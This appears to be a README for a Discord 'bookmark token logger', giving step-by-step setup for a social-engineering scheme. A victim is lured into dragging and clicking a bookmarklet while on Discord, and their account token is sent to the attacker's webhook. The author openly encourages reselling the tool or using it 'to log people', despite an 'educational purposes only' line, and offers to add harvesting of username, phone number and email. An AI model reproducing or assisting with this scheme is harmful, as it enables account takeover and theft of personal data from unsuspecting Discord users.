# Discord-Bookmark-Token-Logger-Free
discord bookmark logger that i made, which was pretty easy.

you can resell this or use it to log people

educational purposes only, these are just examples.

1 create a website with a drag me function (you can just skid one)

2 upload the file index.php

3 replace 'yourwebhook' with your discord webhook

4 go to url2webhook.js, replace yourwebsite.com with your website

5 add the new url2webhook.js script you edited to your verify function

6 drag the drag me button and click it while on discord! you are now logged

i can make it so this show username, phone number, email with discord's api, but i will only do such if this gets 10 stars.
